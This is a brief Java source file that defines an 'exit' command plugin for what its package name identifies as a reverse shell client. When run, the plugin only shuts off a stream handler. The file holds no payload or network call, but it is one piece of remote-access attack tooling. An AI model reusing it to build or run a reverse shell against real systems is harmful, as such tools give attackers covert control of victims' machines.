package obs1d1anc1ph3r.reverseshell.client.plugins;

import obs1d1anc1ph3r.reverseshell.client.utils.StreamHandler;

public class ExitCommand implements CommandPlugin {

	private final StreamHandler streamHandler;

	public ExitCommand(StreamHandler streamHandler) {
		this.streamHandler = streamHandler;
	}

	@Override
	public String getCommandName() {
		return "exit";
	}

	@Override
	public String execute(String[] args) {
		streamHandler.turnOff();
		return null;
	}

}
